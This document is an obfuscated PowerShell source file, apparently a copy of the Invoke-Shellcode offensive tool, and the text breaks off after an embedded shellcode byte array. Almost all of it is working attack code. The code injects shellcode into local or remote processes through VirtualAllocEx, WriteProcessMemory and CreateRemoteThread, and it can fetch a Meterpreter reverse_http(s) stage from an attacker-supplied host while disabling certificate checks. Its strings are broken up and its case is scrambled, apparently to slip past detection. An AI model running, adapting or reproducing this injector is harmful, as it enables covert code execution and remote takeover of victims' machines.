function iNvokE-shelLCode
{


[CmdletBinding(  DefaultParameterSetName   =   {'RunLo'  + 'c'+  'al'}, SupportsShouldProcess =   ${T`RUe} , ConfirmImpact =   "H`iGh" )] Param ( 
    [ValidateNotNullOrEmpty(  )]
    [UInt16]
    ${PR`oCEs`sID},
    
    [Parameter( ParameterSetName =  "r`UN`locAl"   )]
    [ValidateNotNullOrEmpty(  )]
    [Byte[]]
    ${sHe`llc`ode},
    
    [Parameter(  ParameterSetName   =   "MeTASP`lo`IT"  )]
    [ValidateSet(  ( 'win'+  'dows/m' +  'et'+'erpr' + 'eter/rev'  + 'e' +  'r'  + 'se'+'_htt'+ 'p'),
                  (  'windows/meterprete'  +'r' +  '/reve'+ 'rs' + 'e'+ '_ht' +  't' + 'ps'),
                  IgnoreCase  =  ${T`Rue} )]
    [String]
    ${paY`L`OAd}  =  (  'w' +  'indo'  + 'ws/m'  + 'ete' + 'r'+ 'prete' + 'r/r' + 'eve' + 'rs'  +  'e_http'  ),
    
    [Parameter(   ParameterSetName   =  "LI`STPAYLO`ADs" )]
    [Switch]
    ${lIstME`T`ASPLo`iTpaYL`OaDs},
    
    [Parameter(   Mandatory   =   ${TR`Ue},
                ParameterSetName   = "MEt`AS`PL`oIT"  )]
    [ValidateNotNullOrEmpty( )]
    [String]
    ${l`HosT}  =  ('1' + '27.0.'  +  '0.1' ),
    
    [Parameter(  Mandatory = ${Tr`UE},
                ParameterSetName  = "MET`As`pLoIT" )]
    [ValidateRange(   1,65535 )]
    [Int]
    ${L`poRt}   =   8443,
    
    [Parameter( ParameterSetName =  "MeT`AsPlo`It" )]
    [ValidateNotNull(  )]
    [String]
    ${Us`er`AgEnt} =   (ge`T`-Ite`MpRO`pertY -Path (  (  'HKCU:'  +'{0}So'  +'ftw'+ 'are'  +  '{0}M'+  'icros'+'of'+ 't{' + '0}'+ 'W' +'indows{0}Cu'+  'rren'+ 't' +  'Versi'+  'on{0}In'+ 'terne' +  't '+ 'Setti' + 'n' + 'gs') -F [cHaR]92  )).'User Agent',

    [Parameter(   ParameterSetName   =   "m`Etas`pLOIT" )]
    [ValidateNotNull(  )]
    [Switch]
    ${LEG`ACY}  = ${F`A`LSe},

    [Parameter(  ParameterSetName  =  "m`ET`AsPloiT"  )]
    [ValidateNotNull( )]
    [Switch]
    ${prO`XY}  =  ${Fa`Lse},
    
    [Switch]
    ${FO`RCE}  =  ${f`A`LSE}
  )

    seT`-STRICTM`o`DE -Version 2.0
    
    
    if (  ${P`ScMD`LEt}.ParameterSetName -eq (  'Li' +'s'+ 'tPa' + 'yloads'  )  )
    {
        ${av`A`iLaBLe`pA`YlOADs}  =  (GE`T-c`Om`maND Invoke-sHEllcODE).Parameters[(  'P'+ 'ayloa'  + 'd')].Attributes   |  
            WHER`E-Obj`ecT {${_}.TypeId -eq [System.Management.Automation.ValidateSetAttribute]}
    
        foreach (${P`AYlO`Ad} in ${A`VailAble`pAYl`oADS}.ValidValues  )
        {
            n`Ew`-oBJecT PsOBjEct -Property @{ Payloads =   ${pa`y`LoAd} }
        }
        
        Return
    }

    if (  ${psbOUndPA`Rame`T`e`RS}[(  'Pr'+  'ocessI'  + 'D'  )]  )
    {
        
        
        GeT-p`R`ocess -Id ${Pr`OcE`ssid} -ErrorAction StOP   |  O`U`T-null
    }
    
    function lOCal:GET-delEgaTetyPE
    {
        Param
        (
            [OutputType(  [Type] )]
            
            [Parameter(  Position =  0  )]
            [Type[]]
            ${par`Ame`Te`RS}  =   (new-oBJ`e`CT typE[]( 0 ) ),
            
            [Parameter( Position =   1   )]
            [Type]
            ${reT`UrN`TyPe}   =   [Void]
        )

        ${d`oMain} = [AppDomain]::CurrentDomain
        ${Dyn`A`sSeMBly}  =   nE`w-ObJE`Ct systeM.refLEctIoN.aSsemblYnAmE( ( 'R'+ 'ef'+  'lectedDele' +'gate' ))
        ${As`S`embl`yBuIL`dER}  =  ${d`omAIn}.DefineDynamicAssembly(${d`YnassE`mBLy}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        ${mO`DUl`ebUi`LDER}  = ${AsSEmbl`YBuI`LD`ER}.DefineDynamicModule(( 'InMem'+'o'  +  'ryModule'  ), ${Fa`Lse}  )
        ${tYpe`B`U`ilDeR} = ${MOD`ULE`BUi`L`Der}.DefineType(( 'My' +  'D' +  'elega'+'teT'+'ype'  ), ('Cl' +  'a'+'s'  +  's, Publ' +'ic,'+' Sea'+'led, AnsiClass,'  + ' Auto'+ 'Class'  ), [System.MulticastDelegate]  )
        ${c`On`STrU`cToRBUIl`DER} =  ${t`y`pEbU`ilDER}.DefineConstructor(('RTSpecia'  + 'lName, '+'HideBySi' + 'g' + ', P'  +  'ublic'), [System.Reflection.CallingConventions]::Standard, ${pA`Rame`Te`Rs})
        ${CONsTR`Uct`OrbuI`LD`Er}.SetImplementationFlags(  (  'Runtime, '  +'Ma'+  'nag' +  'ed'))
        ${MEt`HoD`BU`ILDeR}  = ${tYpeb`UI`ldEr}.DefineMethod('Invoke', ( 'P' +'ublic'  +  ','  +  ' '+  'H'  + 'ideBySig, NewSlot,'  +  ' Virtual'  ), ${rETUR`NT`YPE}, ${PARA`m`ETE`Rs}  )
        ${m`ET`HoD`BuILd`ER}.SetImplementationFlags(  (  'Runtime, '+  'Ma'+'na'  +'g'  +  'ed'))
        
        wRit`E`-O`UTpUT ${T`ypEb`UI`ldeR}.CreateType(  )
    }

    function LoCal:GET-prOcADdrESS
    {
        Param
        (  
            [OutputType( [IntPtr])]
        
            [Parameter(   Position   =  0, Mandatory =   ${t`RUE}  )]
            [String]
            ${mO`duLe},
            
            [Parameter( Position =  1, Mandatory  =   ${t`RUe}  )]
            [String]
            ${PROCE`Du`Re}
         )

        
        ${s`Y`sTema`SSe`MblY}  = [AppDomain]::CurrentDomain.GetAssemblies( )  |
            w`HER`e-objEcT { ${_}.GlobalAssemblyCache -And ${_}.Location.Split((  ('oUjo'+  'Uj'  ) -rePlAcE  'oUj',[cHAr]92) )[-1].Equals((  'System'  + '.d'  +'l' +  'l')) }
        ${UNs`A`F`ENatiV`E`M`etHOdS}  = ${S`ysTeMa`SsE`MbLY}.GetType(  ('Micr' +  'osoft.Win3'  +  '2'  + '.UnsafeNat'  + 'i'  + 'v'+ 'eMethods'))
        
        ${G`eT`M`oDULeHAN`dLE}  =  ${Uns`AFEna`TIvE`mE`T`hO`DS}.GetMethod(  ('Ge'  +  't' +  'Module' +'Handl'  +'e'  )  )
        ${G`EtpRo`CAdd`REsS}  =   ${unSaFeNATI`VE`M`etHo`Ds}.GetMethod(  ('Ge'  +'tProcA'+  'ddre' + 's'+  's'))
        
        ${kE`RN32`HANDLE}  =  ${Get`M`OdUL`EhAn`Dle}.Invoke(  ${N`Ull}, @(${m`Odu`lE} ))
        ${T`M`pPTr}   = New-`oBje`ct InTPtr
        ${hanD`L`EreF}  = N`ew-`obJ`ecT systeM.RunTImE.INtEROpseRviceS.hAndleRef( ${t`MPPtr}, ${k`E`Rn32H`ANDLe}  )
        
        
        Write`-`ouT`pUT ${Ge`TpROcA`DdRE`Ss}.Invoke( ${nU`lL}, @([System.Runtime.InteropServices.HandleRef]${hAn`DlEr`eF}, ${P`RO`c`EDURE}  )  )
    }

    
    function loCAl:EmIt-CAlltHrEADsTUB (  [IntPtr] ${baSE`Ad`dr}, [IntPtr] ${ex`i`TT`hReA`DadDR}, [Int] ${ArC`hiT`ECturE})
    {
        ${Int`s`IzeptR}  =   ${Arc`hiT`ec`TUrE} / 8

        function LOCal:CONveRTtO-lIttlEEndiAN (  [IntPtr] ${A`dd`RESS} )
        {
            ${lITTl`Ee`NDia`NB`YteaRRAY} =  Ne`w-oB`jecT Byte[]( 0  )
            ${A`d`dRESs}.ToString( "X$($IntSizePtr*2)" ) -split '([A-F0-9]{2})'  |   f`O`REAch-`obJEcT { if (${_}  ) { ${l`iTtleEn`dia`NbY`TEaRrAY} += [Byte] (  '0x{0}' -f ${_}  ) } }
            [System.Array]::Reverse(  ${LItTLEen`dI`AnB`YTE`ArRaY} )
            
            w`Rite-`Out`put ${LIttleE`ND`iAN`BY`TeaR`RaY}
        }
        
        ${C`AlLsT`UB} =  N`E`w-OBJecT BYtE[](  0)
        
        if ( ${in`T`S`IZeptr} -eq 8 )
        {
            [Byte[]] ${cALl`s`Tub}   =   0x48,0xB8                      
            ${cAL`lST`UB} += C`Onver`Tto-l`IT`TleEn`DIan ${baSEa`dDR}       
            ${cal`L`sTub} += 0xFF,0xD0                              
            ${C`AL`LsTub} += 0x6A,0x00                              
            ${cA`lLs`T`UB} += 0x48,0xB8                              
            ${Cal`Ls`TUb} += CON`V`ErTTo-LITT`L`Ee`NDIAn ${EXit`ThrE`A`d`ADdr} 
            ${ca`ll`sTUb} += 0xFF,0xD0                              
        }
        else
        {
            [Byte[]] ${Ca`l`lStuB}   =   0xB8                           
            ${C`Al`lstUb} += CoNVERT`T`o-LITT`LEe`N`DiAn ${bASeA`D`dR}       
            ${Cal`lsTuB} += 0xFF,0xD0                              
            ${cALl`STUb} += 0x6A,0x00                              
            ${cAL`l`sTUB} += 0xB8                                   
            ${c`AL`LStUb} += cO`NverTto-`littLe`en`diaN ${eX`iTt`hRead`AD`dr} 
            ${C`A`llSTUB} += 0xFF,0xD0                              
        }
        
        WRITe-`OuTP`UT ${C`AlLs`TUb}
    }

    function LocAL:InjeCT-REMOteSHelLcODE ([Int] ${P`RoCE`ssiD} )
    {
        
        ${Hp`Ro`c`ESs}   =  ${oPeN`pR`OCEsS}.Invoke(0x001F0FFF, ${Fa`Lse}, ${PRO`CESs`Id}) 
        
        if ( !${HP`R`oceSS} )
        {
            Throw ('Unabl'+  'e'  +' '  +  'to'+' ' + 'o'+  'pen '  +  'a '  + 'proc' +  'ess '+ 'ha'  + 'ndle'+' '  +  'fo' +  'r '+ 'PI' +  'D: '  + "$ProcessID"  )
        }

        ${iSw`Ow`64}  = ${FA`L`SE}

        if (  ${64`Bit`Cpu}  ) 
        {
            
            ${is`WOW`64pRo`CEsS}.Invoke( ${h`pRoc`e`SS}, [Ref] ${I`SWOw`64}  )  |  oUt-N`Ull
            
            if (  (!${IS`W`Ow64} ) -and ${pO`wE`R`sHELL3`2BIt} )
            {
                Throw ('Unable t'+ 'o inje' +  'c'+ 't'+ ' '+ '6' + '4-bi' +  't shell'+ 'cod'  +'e'  + ' ' +'from ' +'with' + 'in '  + '3'  +'2-bit Power' + 'sh'  + 'ell.'  +' Use the 64'+'-bi'+'t versi'+ 'on '+  'of Powersh'+'ell if you'+ ' w'+'an'  +  't'+ ' this to '  +  'work' +'.' )
            }
            elseif (  ${iS`W`ow64}) 
            {
                if ( ${S`hElL`code`32}.Length -eq 0 )
                {
                    Throw ('No' +' ' + 'shellc' +'ode'  +' '  +  'was' +  ' ' +  'placed'+' '  +'in'  +' '  +  't' + 'he ' +( (  'lmwShellcode' +  '3'  +'2 '  )-crEplace  ([cHAR]108 +  [cHAR]109+  [cHAR]119 ),[cHAR]36 ) +  'vari'  +  'abl'+ 'e!'  )
                }
                
                ${sh`ELl`c`oDE}  = ${shELL`cOdE`32}
                W`RITE-`VER`BOsE ( 'Injectin'+  'g' + ' '+'into'  + ' a Wow'  +  '64 ' +'pro' +'cess.')
                W`R`itE-VER`BO`SE ('U'+ 'sing 32-b'+  'it she'+  'llc' +'ode'+'.' )
            }
            else 
            {
                if ( ${shELLc`O`DE`64}.Length -eq 0 )
                {
                    Throw ( 'No'+' '+  'shellc'  +'od' +  'e ' +  'was'+  ' '  +  'pl'  +  'a'+  'ced ' + 'i'  + 'n '  + 'the' +  ' '+ (  (  'kh'  +  'A'+  'Shellco' +  'd'  +  'e64 '  ) -cRePlAcE 'khA',[CHaR]36)+'var' + 'iab'+ 'le!' )
                }
                
                ${Sh`Ellco`dE} = ${sH`ELLC`Ode`64}
                W`RIt`E-VerBOSE ( 'Using 64' +  '-' +  'b'+  'it'  +' shellcode.')
            }
        }
        else 
        {
            if (${S`HEll`c`OdE32}.Length -eq 0)
            {
                Throw (  'No'  +  ' ' +'shell'  +  'cod' +  'e '+ 'was'  + ' '+'p' +'lace'  +'d '  +  'in'  + ' '+ 't' +  'he '  +('{0}' + 'Sh'+  'el' +  'lcode32 '  )-F  [Char]36  +  'v' + 'ariable!' )
            }
            
            ${s`h`eLlCodE} =  ${s`hE`lLcoDE`32}
            wR`i`TE-Ve`RBOse ('Using'  +' 32-'  + 'bit sh'+'ellcode.' )
        }

        
        ${R`em`OTEmE`MAd`Dr} =  ${v`IRtU`A`LALLOCeX}.Invoke( ${hpRO`C`ess}, [IntPtr]::Zero, ${SHEll`cO`DE}.Length  +  1, 0x3000, 0x40) 
        
        if (!${rEm`otEm`eM`ADDr} )
        {
            Throw ('Un' +'ab'+'le '  +'t'  +'o '+'allo' + 'cate '+'sh' +'ellcode' +' '+ 'mem'  +  'ory ' +  'in'+ ' '  + 'PID'+ ': ' + "$ProcessID" )
        }
        
        wR`ITE-V`e`RbO`SE "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)")) "

        
        ${wr`ItEprO`Ce`SsmEm`oRy}.Invoke( ${Hpro`C`eSs}, ${REmOteMEM`A`d`dR}, ${she`llc`OdE}, ${SHell`co`dE}.Length, [Ref] 0 )  |   OUt`-`NULL

        
        ${eXi`TTH`R`eAda`DDr}  =  gET-P`Roc`ADd`Re`sS KernEL32.DLl EXIttHRead

        if (  ${IS`W`OW64}  )
        {
            
            ${cAL`l`sTUB} =   EmIt-CaLLT`HR`eadST`Ub ${RE`M`OTEmemADDr} ${eXi`Tt`hrE`A`daddr} 32
            
            w`Ri`TE-VEr`BosE ( 'Emit' + 'ti' + 'ng 32' +  '-bi'+  't '  +  'asse'+  'mbly c' +  'al'  +'l s'  +  'tu' +  'b.'  )
        }
        else
        {
            
            ${cA`l`LstUb} = em`iT-CA`l`LTHreAD`Stub ${rEmO`TE`MeM`A`DdR} ${EXI`TTH`Re`AD`ADdr} 64
            
            wR`itE-Ve`RB`oSE ( 'Emitt'  + 'ing 6'  +'4-b'+  'it ass'  +'e'+  'mbl' +'y c' +'al'  +'l s' +'t' +  'ub.')
        }

        
        ${ReMOT`ES`TUBADdr} = ${v`irTuAlAl`LOC`ex}.Invoke(  ${HPR`oC`ess}, [IntPtr]::Zero, ${CallS`TUB}.Length, 0x3000, 0x40  ) 
        
        if (  !${re`MO`T`eStuB`ADdR})
        {
            Throw ( 'Unab' +'le'+' '  +'t'+  'o '  + 'al' +'lo' +'cate '  +  'thre' +  'ad ' +  'call'  +  ' ' +'stu'  + 'b '+  'mem'  +  'o'+'ry ' +'i'  + 'n '  +'PI'  +'D: ' +"$ProcessID")
        }
        
        W`RITE-V`erBo`Se "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)")) "

        
        ${WRi`Tepr`oC`E`ssM`E`moRy}.Invoke(${Hp`R`ocesS}, ${r`E`MOtE`stUba`ddR}, ${caL`Ls`TUb}, ${CaL`LsT`UB}.Length, [Ref] 0  )   |  Ou`T-N`ULl

        
        ${thR`EA`dh`ANdle}   =   ${C`ReATeREMo`TE`ThreaD}.Invoke( ${h`proCE`sS}, [IntPtr]::Zero, 0, ${ReMo`TEsT`UB`A`dDR}, ${rEmotem`eMad`DR}, 0, [IntPtr]::Zero  )
        
        if (  !${ThR`eADH`An`DLe})
        {
            Throw (  'Una'+  'ble '  +'to'+ ' '+  'lau'  + 'nc'  + 'h '  +  'r' +'emot'+'e '+  'thr'  +'ead '+'in'+' '  +'PID:' +' '+ "$ProcessID")
        }

        
        ${c`LoSEHAN`D`LE}.Invoke(${hp`ROC`ESS} ) | ouT`-nU`Ll

        WrITe`-vE`RBOse ('She' +'ll' +  'code '+'inje'  +  'ction'  +  ' com'  +'plete!')
    }

    function lOCal:INJECt-lOCALShelLcOdE
    {
        if (  ${pOweRs`he`ll32biT}  ) {
            if (${Sh`ell`C`Ode32}.Length -eq 0)
            {
                Throw (  'N' +'o ' +  'shellc'  +  'o' +'de '+  'w'  + 'as '  +  'p'+ 'lace'+  'd ' +  'i' +  'n '  +  'the'  +' '+('{0}Shel'+  'lco'+  'de32' + ' ' )-F  [ChAR]36 +  'v'  +  'aria'+  'ble!')
                return
            }
            
            ${S`HElLc`oDe} =   ${ShELl`co`d`e32}
            wr`iTe-vEr`BosE ( 'U' + 's'  + 'ing 3'+'2-bit sh'+ 'ellcode.'  )
        }
        else
        {
            if (${S`heLLcOdE`64}.Length -eq 0 )
            {
                Throw (  'No'+  ' '  + 'shel'+  'lco'+'de '+  'was'  + ' '  +'p' +  'laced ' + 'i'  +  'n '  + 't' +'he ' +  ( (  'JZ'  +'oShellco' +'de6' + '4 ') -cREPLaCE 'JZo',[Char]36 )+'va'  +'r'  + 'iable!')
                return
            }
            
            ${shEL`lCO`DE} = ${SHeLLc`o`D`e64}
            w`RiTe-`VERboSe (  'Us'  +  'ing'+  ' 64-b' +'i'  + 't' +  ' shellcode.' )
        }
    
        
        ${b`AsEaddR`E`sS}  =   ${vi`RtuAl`AL`LOc}.Invoke(  [IntPtr]::Zero, ${Sh`ELlc`ode}.Length  + 1, 0x3000, 0x40 ) 
        if (!${BaS`eA`ddreSS})
        {
            Throw ( 'U' + 'n' + 'able '+'to'  +  ' '  + 'allo' + 'c'  + 'ate '  + 'shellcod'+  'e'+ ' '  + 'me'+'mory '+ 'in' +' '+'P'  + 'ID: '+  "$ProcessID" )
        }
        
        Wr`iTE`-V`ErB`oSE "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)")) "

        
        [System.Runtime.InteropServices.Marshal]::Copy(  ${sh`E`l`LcODE}, 0, ${BASE`Add`R`EsS}, ${ShELL`C`ODE}.Length)
        
        
        ${Ex`ITT`hrEa`DADdr}  =  Get-`p`R`ocAD`DREsS kErNEl32.DLL ExittHREAd
        
        if (${poWE`RShEl`L32biT} )
        {
            ${cAl`lSt`Ub}   = EMIT`-CALLTHrE`Ads`T`UB ${B`ASeAddre`ss} ${ex`I`TThrEAD`AddR} 32
            
            WR`iTE-VE`R`BosE ('Em'+ 'itting'  +' 3' + '2-b' +'it asse' +'mbly call ' + 'st'  + 'ub.'  )
        }
        else
        {
            ${cAL`L`STUb} = eMi`T`-CAlLtHrE`ADst`Ub ${bA`se`AdDress} ${exItt`HR`ead`Ad`DR} 64
            
            WRIT`e-VER`B`ose ('Emitting'  + ' 64'+ '-bit'+  ' assembl'  + 'y '  +  'call st' +  'ub.')
        }

        
        ${cAlLS`TuB`AD`Dr`EsS} =   ${V`irtu`A`laLLoc}.Invoke( [IntPtr]::Zero, ${caL`lSTUb}.Length   + 1, 0x3000, 0x40  ) 
        if (  !${c`AL`LSt`UB`ADDRESs} )
        {
            Throw ( 'Una'+ 'ble t' +'o a' + 'l'  +'locate th'  +'read'  + ' call st'+ 'ub'  +'.' )
        }
        
        wR`iTe-VERbo`se "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)")) "

        
        [System.Runtime.InteropServices.Marshal]::Copy(${Ca`LlS`TuB}, 0, ${CalL`STUBA`D`dRe`Ss}, ${CA`lls`TUB}.Length )

        
        ${t`hREadHa`ND`lE}  = ${C`ReAT`EThrEAd}.Invoke(  [IntPtr]::Zero, 0, ${ca`lLSTuB`ADd`ReSS}, ${bas`eAD`Dr`ESS}, 0, [IntPtr]::Zero)
        if (  !${tHReA`dHaN`dle} )
        {
            Throw (  'Un' +  'ab'+'le '+'to laun'+  'ch th'  +'re' +  'ad.')
        }

        
        ${W`A`I`TForSin`GlEObjecT}.Invoke(${TH`R`EAdHandLE}, 0xFFFFFFFF ) | oUT-nU`ll
        
        ${V`iR`TUALf`ReE}.Invoke(${cAllS`T`Ub`Addre`SS}, ${C`AlLst`Ub}.Length  +   1, 0x8000  ) |  Out`-N`Ull 
        ${virtUAL`F`R`eE}.Invoke( ${b`As`eAdDrE`SS}, ${sh`el`lCOde}.Length +   1, 0x8000)   |   oUT-n`U`LL 

        Writ`E-`V`Erb`OSE ('Shell'+  'c' + 'ode inject'  + 'i'  +'on c' +  'o' +'mplete!' )
    }

    
    ${i`S`woW6`4proceS`SADdr}  =   ge`T-`proca`dDR`ESs KErNEL32.DLL ISWow64PROCESS
    if (  ${IS`woW`64`pRoces`SAD`DR} )
    {
        ${i`sW`OW6`4`ProCESSdEl`EG`ATE}   =   get-De`LeG`ATETYPE @([IntPtr], [Bool].MakeByRefType( )  ) (  [Bool])
        ${IsWO`w6`4P`R`ocESS}  =  [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${isWoW6`4PRo`c`eSSA`dDr}, ${iSwOW64P`ROcEs`sdelEg`Ate})
        
        ${64BiT`CpU} =   ${tR`Ue}
    }
    else
    {
        ${64BI`Tc`pu} =   ${f`Alse}
    }

    if ( [IntPtr]::Size -eq 4  )
    {
        ${P`OweR`sh`ELl3`2BIT} = ${tr`Ue}
    }
    else
    {
        ${pO`W`E`RSheLL`32Bit}   = ${Fa`LSE}
    }

    if (${pSc`MdlEt}.ParameterSetName -eq (  'Me'  +'ta'+ 'sploit'  ) )
    {
        if (!${Po`w`eR`SheLl32biT}  ) {
            
            

            
            ${ro`OTInV`OC`AtiON} =   ${MYin`VOCat`Ion}.Line

            ${r`EspO`N`se}   = ${TR`UE}
        
            if (  ${fo`Rce} -or (  ${respON`SE}  =   ${P`s`CmdLet}.ShouldContinue(  (  'Do y' +  'ou'+' wa'+  'nt to '  +'laun'  + 'ch the'  + ' '+ 'pa'  +  'yloa'  + 'd '  +  'from x86 Powershell?'  ),
                   ( 'Atte'+ 'm' +  'pt to execut'+ 'e 32-bit' +' sh' + 'el'+  'l' +  'c' + 'o'+'de fr' +  'o' + 'm 6'  + '4-'+  'b'+ 'it Power' +'she'  +'ll. '+  'Note: ' + 'Th' +'is pro'+'cess tak'  +  'es about'+  ' one '  +'m'  +  'i'  +  'nut'+ 'e. ' +'Be patient! Y'  +  'ou' +  ' '+ 'will also' + ' ' +'s'  + 'ee som'+  'e' + ' artifact'+ 's'+  ' o'  +  'f the sc'+ 'rip'  + 't l'  +  'oading in t'  + 'h'+ 'e other pr'  + 'o'+  'c' +'ess.'  )  ) )  ) { }
        
            if ( !${REsPo`N`Se}   )
            {
                
                Return
            }

            
            if (${MyInvO`cA`TiON}.BoundParameters[(  'Forc'  +  'e')]  )
            {
                wr`ItE-`VErB`OSE ('Execu'+ 'tin'+'g'  +  ' '  + 't'+'he '  +  'foll'  + 'owi'+ 'ng ' +'from'  +' '+'32-bit' +' ' +  'PowerShe'+'l'+'l: ' +"$RootInvocation"  )
                ${co`M`mANd}  =   "function $($MyInvocation.InvocationName) {`n"   +  ${M`yInVoc`AtIOn}.MyCommand.ScriptBlock + "`n}`n$($RootInvocation)`n`n"
            }
            else
            {
                WrITe-`V`ER`BoSe ('E' +'xe'+ 'cuting '  +  't' +  'he '  +'foll'  +  'o'  +'win'  + 'g '+'fro' +  'm '+'32'+  '-bi'+ 't '+'Power'  + 'Shell' +  ':'+' ' +  "$RootInvocation "  +'-F'+'orce')
                ${c`o`mmaNd} =   "function $($MyInvocation.InvocationName) {`n" +  ${my`InvOC`AT`I`ON}.MyCommand.ScriptBlock +  "`n}`n$($RootInvocation) -Force`n`n"
            }

            ${Comm`And`BYT`ES} =  [System.Text.Encoding]::Ascii.GetBytes( ${C`om`Mand} )
            ${ENCODE`dCo`M`M`And} =   [Convert]::ToBase64String(${CO`mm`AN`DByT`eS}  )

            ${e`xE`cUtE}   = (  (  'K8D'+'C'  +'ommand').ReplAce( (  [Char]75  + [Char]56 +[Char]68 ),'$' )) + ( ' ' + (  'SI'  + 'F ' ).RePLACe( ( [cHaR]83 +  [cHaR]73  +  [cHaR]70),[STrinG][cHaR]124 ) +"$Env:windir\SysWOW64\WindowsPowerShell\v1.0\powershell.exe " +'-'+'NoPr'  +'of'  +'ile '  + '-' + 'Com'  +  'mand ' +  '-')
            INv`o`Ke-EX`pREsSIoN -Command ${ex`ec`UTe}   |   o`UT-nULL

            
            Return
        }
        
        ${reSp`oN`Se}   =  ${TR`Ue}
        
        if (   ${f`OrCe} -or ( ${R`eSP`O`NsE} = ${pSC`m`dLET}.ShouldContinue(  ( (  'Do you know'+' w'+ 'hat you' +'{' +'0}re '+  'doing?')-F[cHAr]39 ),
               "About to download Metasploit payload '$($Payload)' LHOST=$($Lhost), LPORT=$($Lport) " )  )  ) { }
        
        if (  !${rEsp`O`Nse}  )
        {
            
            Return
        }
        
        switch (  ${p`AYl`OAd} )
        {
            ('windows' +  '/m'  + 'eterpre' +  'ter/rev' +'erse_ht'+'tp'  )
            {
                ${s`SL}  =   ''
            }
            
            ('wind'+'ows/meterpr'+  'et'  +'er' + '/r' +'ev'  +'ers'  +'e_https')
            {
                ${s`sl} = 's'
                
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback   = {${t`RUE}}
            }
        }
        
        if (${lE`Ga`cy}  ) 
        {
            
            ${R`EqU`eSt}  =   "http$($SSL)://$($Lhost):$($Lport)/INITM"
            WRITe`-VEr`BoSE (  'Re'  +  'qu'  + 'es'+  'ting ' + 'meterp'+'ret'+ 'er' +  ' '+'p' +'ayload'  +' '+ 'fr'+ 'om '+  "$Request" )
        } else {

            
            ${CH`ARa`Rr`AY} =  48..57   + 65..90 + 97..122  |   fOrEa`cH`-Obj`EcT {[Char]${_}}
            ${S`UmtE`ST} =   ${fA`l`SE}

            while (  ${S`UMTE`ST} -eq ${F`AL`Se}  ) 
            {
                ${genErA`TedU`Ri}   =   ${Cha`R`A`RrAY} |   GE`T`-rAn`DoM -Count 4
                ${SUmT`E`st}   =  ( ([int[]] ${GeneRAt`eD`UrI} |  mEAS`UrE-O`BjEct -Sum).Sum % 0x100 -eq 92  )
            }

            ${requE`st`UrI}  =   -join ${GEnera`TE`d`Uri}

            ${RE`Qu`eST}   =  "http$($SSL)://$($Lhost):$($Lport)/$($RequestUri)" 
        }
           
        ${u`RI}  = NEw-o`BJE`Ct uri(${RE`q`UeST}  )
        ${WebC`lI`ent}  =  New`-Ob`J`ect SySTEM.net.WEBclIent
        ${w`E`BcliENt}.Headers.Add(('u' + 's'+  'er-ag'+ 'ent'  ), "$UserAgent" )
        
        if ( ${pRo`xY})
        {
            ${we`B`PrOXyOb`je`cT}   =   New`-OB`JECT SyStem.neT.WEBPrOXY
            ${PRo`XYA`D`Dr`ESS}  =   (  G`Et-ITEMp`ROP`E`RTY -Path ( ( 'HK'  +  'CU' +  ':wjRSo'  +'ftwar'+  'ewjR'+  'Microsof'  + 'twjR'+'Windows'  +  'wjRCur' +'rent'+  'V'  + 'ersionwj'+  'RIn' + 'te'+ 'rnet S'  +'ettin'+ 'gs' ) -rEpLaCE (  [char]119+  [char]106 + [char]82 ),[char]92  ) ).ProxyServer
            
            
            if (  ${pRoXY`A`DdR`Ess} ) 
            {
            
                ${weBpRo`xY`o`BjEcT}.Address  = ${p`Rox`Ya`ddresS}
                ${wEBPROx`y`OBJEct}.UseDefaultCredentials =   ${T`RUe}
                ${we`BC`LIen`T`oBJect}.Proxy   = ${wEB`pRO`x`YOBJE`ct}
            }
        }

        try
        {
            [Byte[]] ${Sh`E`lLCo`dE32}   = ${WEBcl`I`eNt}.DownloadData(${u`RI}  )
        }
        catch
        {
            Throw "$($Error[0].Exception.InnerException.InnerException.Message)"
        }
        [Byte[]] ${shElLcO`de`64}  =   ${shE`LL`cOde32}

    }
    elseif (${PS`B`o`UnDp`ArAme`Ters}[('She'+ 'llcod' +'e' )])
    {
        
        
        [Byte[]] ${ShElLC`o`dE`32}   =   ${shellc`O`de}
        [Byte[]] ${sHel`L`Co`dE64}   =  ${SH`ellco`De32}
    }
    else
    {
        
        
        
        
        
        [Byte[]] ${ShE`LLCo`d`E32}  =  @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
                                  0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,
                                  0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
                                  0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,
                                  0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,
                                  0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                                  0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
                                  0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,
                                  0x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,
                                  0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
                                  0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
                                  0x61,0x6c,0x63,0x00  )

        
        
